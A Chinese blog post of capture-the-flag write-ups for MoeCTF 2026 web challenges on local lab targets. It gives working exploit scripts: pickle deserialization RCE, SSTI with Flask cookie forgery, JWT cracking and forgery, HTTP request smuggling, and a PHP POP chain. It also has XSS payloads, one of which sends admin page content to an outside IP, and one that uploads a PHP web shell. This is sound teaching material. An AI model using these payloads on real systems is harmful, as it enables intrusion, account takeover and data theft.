---
title: "MoeCTF 2026 部分题目 writeup"
description: "MoeCTF 2026 部分题目的解题记录。"
publishDate: 2026-10-11T15:20:38.409Z
tags:
  - "ctf"
  - "web"
heroImage:
  src: ./moectf-2026-writeup.assets/city-light.jpg
  color: "#282838"
  alt: MoeCTF 2026 部分题目 writeup
language: 'zh-CN'
draft: false
slug: moectf-2026-writeup
---

> 感觉西电办的这个比赛挺不错的，还有运维等等这种有意思的方向，题目很多且难度循序渐进，感觉非常适合入门(为什么我入门的时候没碰到😭)，然后最后基本 ak 了 web，两道 java 题因为还没学就放了，writeup 基本是随缘写的，没有写全也懒得补了喵(

## 运维入门指北_revenge

看报错日志，发现是 `nginx` 找不到 `/run/php/php-fpm.sock`

```bash
moeops@ret2shell-1385-20608-1787049425:~$ cat /srv/blog/logs/error.log
2026/08/18 10:37:11 [crit] 290#290: *1 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
```

因为路径写错了

```bash
moeops@ret2shell-1385-20608-1787049425:~$ ls /run/php
php8.4-fpm.pid  php8.4-fpm.sock
```

改成 `8.4`

```nginx
location ~ \.php$ {
  include fastcgi.conf;
  fastcgi_pass unix:/run/php/php8.4-fpm.sock;
  fastcgi_index index.php;
  # fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
  include fastcgi_params;
}
```

保存配置后，执行 `sudo nginx -t` 检查，再执行 `sudo nginx -s reload` 使配置生效。

修好了nginx，继续看

```
## 欢迎使用 Typecho

上传目录无法写入, 请手动将安装目录下的 /usr/uploads 目录的权限设置为可写然后继续升级

### 安装说明

**本安装程序将自动检测服务器环境是否符合最低配置需求. 如果不符合, 将在上方出现提示信息, 请按照提示信息检查您的主机配置. 如果服务器环境符合要求, 将在下方出现 "开始下一步" 的按钮, 点击此按钮即可一步完成安装.**

### 许可及协议

- Typecho 基于 [GPL](https://www.gnu.org/copyleft/gpl.html) 协议发布, 我们允许用户在 GPL 协议许可的范围内使用, 拷贝, 修改和分发此程序. 在GPL许可的范围内, 您可以自由地将其用于商业以及非商业用途.
- Typecho 软件由其社区提供支持, 核心开发团队负责维护程序日常开发工作以及新特性的制定. 如果您遇到使用上的问题, 程序中的 BUG, 以及期许的新功能, 欢迎您在社区中交流或者直接向我们贡献代码. 对于贡献突出者, 他的名字将出现在贡献者名单中.

我准备好了, 开始下一步 »
```

目录不可写，检查目录权限和 PHP-FPM 的运行用户，复测时修复前的输出如下

```bash
moeops@ret2shell-1385-20608-1791732675:~$ sudo namei -l /var/www/html/usr/uploads
f: /var/www/html/usr/uploads
drwxr-xr-x root     root     /
drwxr-xr-x root     root     var
drwxr-xr-x root     root     www
drwxr-xr-x www-data www-data html
drwx------ root     root     usr
drwxr-xr-x root     root     uploads
moeops@ret2shell-1385-20608-1791732675:~$ ps -eo user,pid,args | grep '[p]hp-fpm'
root         291 php-fpm: master process (/etc/php/8.4/fpm/php-fpm.conf)
www-data     292 php-fpm: pool www
www-data     293 php-fpm: pool www
```

`php-fpm` 以 `www-data` 运行，而 `/var/www/html/usr` 为 `drwx------`，`www-data` 无法遍历；`uploads` 属于 `root`，`www-data` 也无法写入，因此需要修改权限和所有者

```bash
sudo chmod 755 /var/www/html/usr
sudo chown -R www-data:www-data /var/www/html/usr/uploads
```

修改后照着数据库配置

```
数据库配置：
数据库名：blog
用户名：moectf
密码：xdsec
表前缀：typecho_
数据库地址：127.0.0.1
数据库端口：3306
```

安装后即可查看 flag



## 熊出没

```
GET / HTTP/1.1
Host: 127.0.0.1:54321
```

```
gopher://127.0.0.1:54321/_GET%20%2F%20HTTP%2F1.1%0AHost%3A%20127.0.0.1%3A54321
```

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 33

Honey Vault
paths: /secret-honey
```

```
GET /secret-honey HTTP/1.1
Host: 127.0.0.1:54321
```

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 45

moectf{6dbe74d7-1314-c63a-8e39-1fed50346269}
```



## 我爱发明

题目逻辑很简单，`20s` 内完成第三个抽象任务就能兑换 flag

所以一开始写了个脚本尝试一下

```python
import hashlib
import re
import requests

BASE = "http://127.0.0.1:57076"

s = requests.Session()
s.get(f"{BASE}/stage/3")                        # 拿 Cookie

codes = []
for invent in range(3, 289, 3):
    r = s.get(f"{BASE}/invent/{invent}")
    if "verdict-ok" in r.text:                  # 判题通过才收集
        codes += re.findall(r'data-code="([A-Z0-9]+)"', r.text)

answer = hashlib.sha256("|".join(codes).encode()).hexdigest()
print("通过", len(codes), "/96")
print("sha256 =", answer)

r = s.post(f"{BASE}/api/finalize", json={"answer": answer})
print(r.text)
```

但这个脚本太慢了，`20s` 根本跑不完，不过还是发现规律就是盖章的序号都是 `6*i`

再经过一系列痛苦而漫长的尝试后，选择开并发做

```python
import hashlib
import re
import requests
from concurrent.futures import ThreadPoolExecutor

BASE = "http://127.0.0.1:55616"
WORKERS = 8

s = requests.Session()
s.get(f"{BASE}/stage/3")                        # 拿 Cookie
cookies = s.cookies.get_dict()

def fetch(invent):
    r = requests.get(f"{BASE}/invent/{invent}", cookies=cookies)
    if "verdict-ok" in r.text:                  # 判题通过才收集
        return re.findall(r'data-code="([A-Z0-9]+)"', r.text)
    return []

with ThreadPoolExecutor(max_workers=WORKERS) as ex:
    codes = sum(ex.map(fetch, range(6, 289, 6)), [])

answer = hashlib.sha256("|".join(codes).encode()).hexdigest()
print("通过", len(codes), "/48")
print("sha256 =", answer)

r = s.post(f"{BASE}/api/finalize", json={"answer": answer})
print(r.text)
```

拿到 flag

### Flag

```
moectf{Comput3rs_@r3_m@gn!fic3nt_+00l}
```




## 日志系统

`/import` 路由完全信任用户上传的文件，直接对其进行反序列化，所以可以构造恶意类完成 RCE

```python
@app.route("/import", methods=["POST"])
def import_logs():
    """
    小D为了兼容各种数据，直接对上传内容执行反序列化，
    还能把还原出来的对象直接展示出来，方便预览。
    """
    f = request.files.get("file")
    if not f or not f.filename:
        return redirect("/?err=请选择要导入的文件")
    data = f.read()
    if not data:
        return redirect("/?err=文件内容为空")
    try:
        obj = pickle.loads(data)
    except Exception as e:
        return redirect("/?err=反序列化失败：" + str(e)[:200])
```

还贴心地给了回显

```python
# 单个对象 / 其他：把反序列化结果直接展示出来供预览
preview = str(obj).replace("\n", " ").replace("\r", " ").strip()[:200]
return redirect("/?msg=" + quote("导入预览结果：" + preview))
```

**exp.py**

```python
import requests
import pickle
from urllib.parse import unquote

cmd = input("输入cmd：")

base = "http://127.0.0.1:62462"

class Evil:
    def __reduce__(self):
        return (eval, (f"__import__('os').popen({cmd!r}).read()",))

payload = pickle.dumps(Evil())

r = requests.post(
    f"{base}/import",
    files={"file":("logs.pkl",payload)},
    allow_redirects=False,
    )

print(unquote(r.headers.get("Location").split("/?msg=")[1]))
```

最终在环境变量中找到 flag

```
输入cmd：env | grep -iE 'flag'
导入预览结果：FLAG=moectf{d24b9f82-c363-307e-1aab-cb0b826ad20f}
```

### Flag

```
moectf{d24b9f82-c363-307e-1aab-cb0b826ad20f}
```





## bblogin

```python
error_html = f'<div class="error"><p>用户{username}登录失败</p></div>'
```

username 直接插入， ssti 模板注入

`{{config}}` 读取 `secret_key`，伪造 admin 的 Cookie

```html
<div class="error"><p>用户&lt;Config {&#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;SECRET_KEY&#39;: &#39;dc08b31be785b29fef723b03db5827e9153c847ed875075cd3eda25fcd02552d&#39;, &#39;SECRET_KEY_FALLBACKS&#39;: None, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;TRUSTED_HOSTS&#39;: None, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_PARTITIONED&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;MAX_FORM_MEMORY_SIZE&#39;: 500000, &#39;MAX_FORM_PARTS&#39;: 1000, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;PROVIDE_AUTOMATIC_OPTIONS&#39;: True}&gt;登录失败</p></div>
```

**exp.py**

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "dc08b31be785b29fef723b03db5827e9153c847ed875075cd3eda25fcd02552d"
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
cookie = serializer.dumps({"token": "admin"})
print(cookie)
```

```
session=eyJ0b2tlbiI6ImFkbWluIn0.aoGV7A.XVh1ro-Y3cuVS18D46msIqFiHy0
```

```
{"info":"moectf{1045b0db-7685-d016-a3c2-04fde3a06711}","username":"admin"}
```



## 黑市走私

### 高级票

`/hint` 直接提示票据用的 `JWT` ，甚至弱密码还给了字典直接开爆

```
普通入场券
header
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
payload
eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJndWVzdCIsInNjb3BlIjoicmVhZCJ9
signature
CG6d0k62ZfRAcq9kdqz3TQIZ6irniRCrQLyqh9WbnM8
完整票据：
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJndWVzdCIsInNjb3BlIjoicmVhZCJ9.CG6d0k62ZfRAcq9kdqz3TQIZ6irniRCrQLyqh9WbnM8
商会常用暗语
老商人喜欢从这些词里挑一个当印章油墨：

MoeCTF / xdu / xidian / xdsec / L / welcome / happy / fish
传闻高级买家的票据上写着 role=admin，交易范围也必须盖成 scope=flags。普通票上的 scope=read 只能看看告示，买不到禁售品。
```

**jwt.py**

```python
import base64, hashlib, hmac

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJndWVzdCIsInNjb3BlIjoicmVhZCJ9.CG6d0k62ZfRAcq9kdqz3TQIZ6irniRCrQLyqh9WbnM8"
head, sig = token.rsplit(".", 1)

for line in open("1.txt", encoding="utf-8", errors="ignore"):
    secret = line.strip()
    mac = hmac.new(secret.encode(), head.encode(), hashlib.sha256).digest()
    if base64.urlsafe_b64encode(mac).rstrip(b"=").decode() == sig:
        print("found:", secret)
        break
```

得到 `secret_key` 是 `fish` ，于是伪造票据

**jwt_forge.py**

```python
import base64, hashlib, hmac

def b64(s):
    return base64.urlsafe_b64encode(s).rstrip(b"=").decode()

header = b64(b'{"alg":"HS256","typ":"JWT"}')
payload = b64(b'{"sub":"traveler","role":"admin","scope":"flags"}')
head = f"{header}.{payload}"
sig = b64(hmac.new(b"fish", head.encode(), hashlib.sha256).digest())
print(f"{head}.{sig}")
```

得到高级票

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiZmxhZ3MifQ.EQmuoZNLf5aUF-WJ1MdjUFZJgPilOkgJRjXawdvIooI
```

### 黑商1

```
黑商1
传闻他熟悉旧码头的两套账本，一套给 CL 小弟看，一套给 TE 联络人看。

黑商1：旧码头账房
他把油灯压低，指了指后门。

“我们要走一些隐秘的小道，我会让 CL 小弟去跟你说，到时候让他和 TE 联系就好。”

交易暗号：先让柜台只看货箱长度，再让后仓按分块清点。
目标货物：/flag1
记得带上能证明你是高级买家的票据。
```

很明显 `CL` 是指 `Content-Length` ，`TE` 是指 `Transfer-Encoding` ，`柜台只看货箱长度` 是指前端只看 `Content-Length` 来切请求边界，`后仓按分块清点` 是指后端按 `Transfer-Encoding: chunked` 解析

所以可以构造一个类似如下的 `http` 请求，让后端读到 `0\r\n\r\n` 就判定 `chunked body` 结束，剩下的 `GET /flag1...` 被当成下一条独立请求直接处理，从而使得这条请求完全绕过了前端的检查

```http
GET /stage1 HTTP/1.1
Host: target
Content-Length: xxx
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /flag1 HTTP/1.1
Authorization: Bearer xxx
Connection: close
```

**exp1.py**

```python
import socket

HOST = "127.0.0.1"
PORT = 63681

JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiZmxhZ3MifQ.EQmuoZNLf5aUF-WJ1MdjUFZJgPilOkgJRjXawdvIooI"

# 第二个请求(走私)
smuggled = (
    b"0\r\n\r\n"
    b"GET /flag1 HTTP/1.1\r\n"
    b"Host: 127.0.0.1:" + str(PORT).encode() + b"\r\n"
    b"Authorization: Bearer " + JWT.encode() + b"\r\n"
    b"Connection: close\r\n\r\n"
)

# 第一个请求
payload = (
    b"GET /stage1 HTTP/1.1\r\n"
    b"Host: 127.0.0.1:" + str(PORT).encode() + b"\r\n"
    + f"Content-Length: {len(smuggled)}\r\n".encode()
    + b"Transfer-Encoding: chunked\r\n"
    + b"Connection: keep-alive\r\n\r\n"
    + smuggled
)

print(f"Content-Length = {len(smuggled)}")
print(f"总发送字节数 = {len(payload)}\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(3)
s.connect((HOST, PORT))
s.sendall(payload)

resp = b""
try:
    while True:
        data = s.recv(4096)
        if not data:
            break
        resp += data
except socket.timeout:
    print("超时")

print(resp.decode("utf-8", errors="replace"))
s.close()
```

```
flag1: moectf{Y0u_have_m4r
```

### 黑商2

```
黑商2
他从不把消息写直，连信封上的冒号都喜欢挪半步。

黑商2：错字信使
他递来一张皱巴巴的运单，冒号前多了一粒灰。

“两边都认识 TE 的名号，可他们读招牌的脾气不同。让前门觉得这不是那张招牌，让后门照常按 TE 的规矩收货。”

交易暗号：Transfer-Encoding 后的空隙，可能就是黑市小巷。
目标货物：/flag2
同样需要高级买家的票据。
```

这里继续提示，`两边都认识 TE 的名号，可他们读招牌的脾气不同。让前门觉得这不是那张招牌，让后门照常按 TE 的规矩收货`，也就是这次前端后端都看 `Transfer-Encoding` 了，但是存在一种手法让前后端解析方式产生分歧，`Transfer-Encoding 后的空隙` 和 `连信封上的冒号都喜欢挪半步` 都在指明在 `Transfer-Encoding` 的冒号前插入一个空格，这在 `RFC` 里是不合法的头，于是前后端对这个头到底算不算 `Transfer-Encoding` 产生了分歧，前端会忽略转而用 `Content-Length`，后端则照样按 `Transfer-Encoding: chunked` 解析

于是脚本小改一下即可

```python
import socket

HOST = "127.0.0.1"
PORT = 63681

JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiZmxhZ3MifQ.EQmuoZNLf5aUF-WJ1MdjUFZJgPilOkgJRjXawdvIooI"

# 第二个请求(走私)
smuggled = (
    b"0\r\n\r\n"
    b"GET /flag2 HTTP/1.1\r\n"
    b"Host: 127.0.0.1:" + str(PORT).encode() + b"\r\n"
    b"Authorization: Bearer " + JWT.encode() + b"\r\n"
    b"Connection: close\r\n\r\n"
)

# 第一个请求
payload = (
    b"GET /stage2 HTTP/1.1\r\n"
    b"Host: 127.0.0.1:" + str(PORT).encode() + b"\r\n"
    + f"Content-Length: {len(smuggled)}\r\n".encode()
    + b"Transfer-Encoding : chunked\r\n"
    + b"Connection: keep-alive\r\n\r\n"
    + smuggled
)

print(f"Content-Length = {len(smuggled)}")
print(f"总发送字节数 = {len(payload)}\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(3)
s.connect((HOST, PORT))
s.sendall(payload)

resp = b""
try:
    while True:
        data = s.recv(4096)
        if not data:
            break
        resp += data
except socket.timeout:
    print("超时")

print(resp.decode("utf-8", errors="replace"))
s.close()
```

```
flag2: 3d_http_5mu6g1!n6}
```

### Flag

```
moectf{Y0u_have_m4r3d_http_5mu6g1!n6}
```



## 七狗收费小说

`/.git` 泄漏，拿 `GitHack` 挖出项目源码

一段 `php` 代码，典型的反序列化构造 `pop` 链子，这里不用 `POST` 方式请求即可进入 `elif` 开始反序列化之旅

```php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $user = new User($username, $password);

    $data = base64_encode(serialize($user));
    setcookie('user', $data, time() + 3600, '/');
    $curr_user = $user;

} elseif (isset($_COOKIE['user'])) {
    $data = base64_decode($_COOKIE['user']);
    $curr_user = unserialize($data);
}
```

终点大概是 `shell_exec` 这里以完成 `RCE` ，需要触发 `__invoke` ，那就需要让一个 `Diagnosis` 对象被当成函数调用

```php
public function __invoke($value)
{
    return shell_exec("$this->key$value");
}
```

这里 `return ($this->action)($this->value)` 刚好把 `action` 属性当成函数调用，会触发 `__invoke` ，那就需要想设置这个 `Diagnosis` 对象的 `action` 属性也为 `Diagnosis` 对象，同时需要触发这个 `__get` ，就得访问 `Diagnosis` 对象一个不存在的属性

```php
public function __get($name)
{
    if ($name === $this->key && is_object($this->action)) {
        return ($this->action)($this->value);
    }
    return null;
}
```

`UserInfo` 的 `__tostring` 刚好会访问 `$this->user` 这个对象的 `username` 属性，这里使 `$this->user` 为 `Diagnosis` 即可完成上一步的诉求，同时使得这里的 `Diagnosis` 的 `key` 是 `"username"` 即可通过上一步的 `if` ，现在就需要触发 `__tostring` 魔术方法

```php
public function __tostring()
{
    return $this->user->username . "（权限等级：" . $this->permission . "）";
}
```

这里的 `echo` 有把 `$this->username` 转字符串的操作，可以接上上一步，所以设置 `$this->username` 为 `UserInfo` 对象即可，不过要走到 `echo` 就得通过前两关 `if` ，第一个 `if` 设置 `username` 和 `password` 相同即可

```php
{
    if ($this->username !== $this->password)
        die("不对，密码不对！");
    if ($this->secret_a !== $this->secret_b)
        die("不行，要重新登录！");

    echo "已经登录啦：$this->username";
}
```

而这里的 `__wakeup` 魔术方法在反序列化的第一时刻就把 `secret_b` 置为随机了，但这个很好绕过，让 `secret_b` 是 `secret_a` 的引用即可

```php
public function __wakeup()
{
    // 每次都要重新登录，这样坏人肯定进不来啦
    $this->secret_b = random_int(1000_0000, 9999_9999);
}
```

自此 `pop` 链全部走通，开始构造

首先是最外层的 `User` 对象，首先构造使其 `secret_b` 是 `secret_a` 的引用，然后在析构时触发 `UserInfo` 类的 `__tostring` 方法，所以构造使 `username` 是一个 `UserInfo` 对象，然后在转字符串时触发 `Diagnosis` 对象 `__get` 方法，所以继续构造使 `UserInfo` 对象内的 `user` 属性为 `Diagnosis` 对象，同时这个 `Diagnosis` 对象内的 `key` 属性为 `username` 以通过 `if` ，然后再把这个 `Diagnosis` 对象内的 `action` 属性当函数执行时触发下一层 `__invoke` 方法，所以构造使得这个外层 `Diagnosis` 对象的 `action` 属性也为 `Diagnosis` 对象即可，然后设置这个内层 `Diagnosis` 对象的 `key` 或 `value` 即可实现 `RCE`

**exp.php**

```php
<?php

class User
{
    public $username, $password;
    public $secret_a, $secret_b;
}

class UserInfo
{
    public $user, $permission;
}

class Diagnosis
{
    public $key, $value, $action;
}

$cmd = "ls /";
$inner_Diagnosis = new Diagnosis();
$inner_Diagnosis -> key = $cmd;
$inner_Diagnosis -> value = "";
$inner_Diagnosis -> action = "";

$outer_Diagnosis = new Diagnosis();
$outer_Diagnosis -> key = "username";
$outer_Diagnosis -> value = "";
$outer_Diagnosis -> action = $inner_Diagnosis;

$UserInfo = new UserInfo();
$UserInfo -> user = $outer_Diagnosis;
$UserInfo -> permission = "";

$User = new User();
$User -> username = $UserInfo;
$User -> password = $User -> username;
$User -> secret_a = 0;
$User -> secret_b =& $User -> secret_a;

$payload = serialize($User);

print($payload);
print("\n");
print(base64_encode($payload));
print("\n");
```

```
"ls /"
已经登录啦：bin
dev
etc
flag
home
lib
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
（权限等级：）

"cat /flag"
已经登录啦：moectf{6886b610-5a5c-9e86-0da0-5fe43cc76195}
（权限等级：）
```

### Flag

```
moectf{6886b610-5a5c-9e86-0da0-5fe43cc76195}
```



## moe论坛

### XSS

结合题目描述和论坛介绍

```
掌管着flag的管理员小D需要实时监控论坛信息
```

```
使用图片共享功能生成专属链接
```

大概存在 `XSS` ，且大概可以用 `img` 标签来构造

尝试抓取 `admin` 的 `Cookie` 然后失败了，应该是设置了 `HttpOnly` ，那直接尝试让 `admin` 访问页面了

`dirsearch` 扫到的 :

```bash
[00:19:44] Scanning: 
[00:19:58] 301 -   355B - /admin  ->  http://127.0.0.1:60137/admin/         
[00:19:59] 403 -    26B - /admin/                                           
[00:19:59] 403 -   317B - /admin/.htaccess                                  
[00:19:59] 403 -    26B - /admin/index.php                                  
[00:19:59] 403 -    43B - /admin/upload.php                                 
[00:20:08] 403 -   317B - /assets/                                          
[00:20:08] 301 -   356B - /assets  ->  http://127.0.0.1:60137/assets/       
[00:20:12] 403 -   317B - /data/autosuggest                                 
[00:20:12] 403 -   317B - /data/adminer.php                                 
[00:20:12] 403 -   317B - /data/backups/
[00:20:12] 403 -   317B - /data/                                            
[00:20:12] 301 -   354B - /data  ->  http://127.0.0.1:60137/data/           
[00:20:12] 403 -   317B - /data/debug/
[00:20:12] 403 -   317B - /data/DoctrineORMModule/cache/
[00:20:12] 403 -   317B - /data/files/
[00:20:12] 403 -   317B - /data/cache/
[00:20:12] 403 -   317B - /data/DoctrineORMModule/Proxy/
[00:20:12] 403 -   317B - /data/sessions/                                   
[00:20:12] 403 -   317B - /data/logs/
[00:20:12] 403 -   317B - /data/tmp/
[00:20:14] 403 -   317B - /fileadmin/                                       
[00:20:14] 301 -   359B - /fileadmin  ->  http://127.0.0.1:60137/fileadmin/ 
[00:20:14] 403 -   317B - /fileadmin/user_upload/                           
[00:20:14] 302 -     0B - /forum.php  ->  /login.php                        
[00:20:15] 403 -   317B - /includes/configure.php~                          
[00:20:15] 403 -   317B - /includes/                                        
[00:20:15] 403 -   317B - /includes/adovbs.inc                              
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/connectors/aspx/connector.aspx
[00:20:15] 403 -   317B - /includes/bootstrap.inc                           
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/connectors/asp/connector.asp
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp
[00:20:15] 301 -   358B - /includes  ->  http://127.0.0.1:60137/includes/
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/connectors/asp/upload.asp
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/upload/asp/upload.asp
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/upload/php/upload.php
[00:20:15] 403 -   317B - /includes/fckeditor/editor/filemanager/upload/aspx/upload.aspx
[00:20:15] 403 -   317B - /includes/swfupload/swfupload.swf
[00:20:15] 403 -   317B - /includes/swfupload/swfupload_f9.swf
[00:20:15] 403 -   317B - /includes/js/tiny_mce
[00:20:15] 403 -   317B - /includes/tiny_mce
[00:20:15] 403 -   317B - /includes/js/tiny_mce/
[00:20:15] 403 -   317B - /includes/tiny_mce/
[00:20:15] 403 -   317B - /includes/tinymce                                 
[00:20:15] 403 -   317B - /includes/tinymce/                                
[00:20:16] 403 -   317B - /includes/fckeditor/editor/filemanager/connectors/aspx/upload.aspx
[00:20:16] 403 -   317B - /includes/fckeditor/editor/filemanager/connectors/php/upload.php
[00:20:16] 403 -   317B - /includes/fckeditor/editor/filemanager/connectors/php/connector.php
[00:20:16] 302 -     0B - /index.php/login/  ->  /login.php                 
[00:20:16] 302 -     0B - /index.php  ->  /login.php                        
[00:20:17] 200 -    1KB - /login.php                                        
[00:20:18] 302 -     0B - /logout.php  ->  /index.php                       
[00:20:25] 200 -    1KB - /register.php                                     
[00:20:26] 200 -   13KB - /server-status                                    
[00:20:26] 200 -   13KB - /server-status/                                   
[00:20:31] 301 -   359B - /templates  ->  http://127.0.0.1:60137/templates/ 
[00:20:31] 403 -   317B - /templates/                                       
[00:20:32] 301 -   357B - /uploads  ->  http://127.0.0.1:60137/uploads/     
[00:20:32] 403 -   317B - /uploads/                                         
[00:20:33] 302 -     0B - /view.php  ->  /login.php                         
                                                                             
Task Completed
```

`/admin` 路由直接访问会提示 ` ADMIN:403 Forbidden - Admin only`

尝试 :

```html
<img src=x onerror="fetch('/admin/',{credentials:'include'}).then(r=>r.text()).then(t=>new Image().src='http://8.148.31.22/attack/1.php?1='+encodeURIComponent('ADMIN:'+t))">
```

但始终没有写入，可能是 `admin` 不能访问外网

同时注意到 `/share.php?my_name=000&user=111` 这里传入了两个 `url` 参数，`user` 为被访问对象，`my_name` 是访问对象，但这里访问对象可以直接控制，所以让 `XSS` 回显到本站 `/share.php?view=visitors` 即可

尝试 :

 ```html
 <img src=x onerror="fetch('/admin/',{credentials:'include'}).then(r=>r.text()).then(t=>new Image().src='/share.php?user=111&my_name='+encodeURIComponent('ADMIN:'+t))">
 ```

成功回显：

```html
ADMIN:<!DOCTYPE html> <html lang="zh-CN"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>管理后台 - Moe Forum</title> <link rel="stylesheet" href="/assets/style.css"> </head> <body> <div class="container"> <header> <h1><a href="/forum.php">Moe Forum</a></h1> <p class="subtitle">A simple 交流社区</p> <nav> <a href="/forum.php">论坛</a> <a href="/announcements.php">公告</a> <a href="/share.php">用户主页</a> <a href="/new_post.php">发帖</a> <a href="/admin/">管理后台</a> <span class="user-info">admin</span> <a href="/logout.php">退出</a> </nav> </header> <main> <div class="admin-section"> <h2>管理后台</h2> <p>欢迎回来，管理员。在这里可以管理论坛公告。</p> <p>管理的智慧：找不到的时候要善用工具</p> </div> <div class="admin-section"> <h2>发布公告</h2> <p>上传 Markdown 文件来发布公告（仅支持 .md 文件）。</p> <form id="uploadForm" action="/admin/upload.php" method="POST" enctype="multipart/form-data"> <div class="form-group"> <label>公告标题</label> <input type="text" name="title" placeholder="公告标题" required> </div> <div class="form-group"> <label>选择文件</label> <input type="file" name="file" id="fileInput" accept=".md,.markdown" required> <p class="upload-info">支持格式：.md &middot; 文件将被保存在服务器并展示在公告页。</p> <div id="fileError" class="alert alert-error" style="display:none;"></div> </div> <button type="submit" class="btn">上传发布</button> </form> </div> <div class="admin-section"> <h2>已发布公告</h2> <table style="width:100%; border-collapse:collapse;"> <tr style="text-align:left; border-bottom:2px solid #c8dcc8;"> <th style="padding:8px;">标题</th> <th style="padding:8px;">文件</th> <th style="padding:8px;">时间</th> </tr> <tr style="border-bottom:1px solid #e0e8e0;"> <td style="padding:8px;">欢迎公告</td> <td style="padding:8px; font-family:monospace; font-size:0.85em;">welcome.md</td> <td style="padding:8px; font-size:0.85em; color:#aaa;">2026-08-23 16:13:38</td> </tr> </table> </div> </main> <footer> <p>Moe Forum v1.0 &middot; Powered by SQLite</p> </footer> </div> </body> </html> <script> (function () { var blacklist = ['php', 'php3', 'php4', 'php5', 'php7', 'phps','.htaccess'];// Same as backend var form = document.getElementById('uploadForm'); var fileInput = document.getElementById('fileInput'); var errorBox = document.getElementById('fileError'); form.addEventListener('submit', function (e) { var filename = fileInput.value; if (!filename) return; var ext = filename.split('.').pop().toLowerCase(); if (blacklist.indexOf(ext) !== -1) { e.preventDefault(); errorBox.textContent = '非法文件类型！PHP文件不允许上传。'; errorBox.style.display = 'block'; fileInput.value = ''; } else { errorBox.style.display = 'none'; } }); fileInput.addEventListener('change', function () { errorBox.style.display = 'none'; }); })(); </script>
```

### 文件上传 RCE

`action="/admin/upload.php" method="POST"` 大概是个文件上传界面，禁了 `['php', 'php3', 'php4', 'php5', 'php7', 'phps','.htaccess']` ，漏了 `phtml` 等

尝试上传一句话木马 :

```html
<img src=x onerror="let fd=new FormData();fd.append('title','AUTO_PHTML');fd.append('file',new File([`<?php system($_GET['cmd']??'id'); ?>`],'a.phtml',{type:'text/plain'}));fetch('/admin/upload.php',{method:'POST',body:fd,credentials:'include'}).then(r=>r.text()).then(t=>new Image().src='/share.php?user=222&my_name='+encodeURIComponent('UPLOAD:'+t))">
```

```html
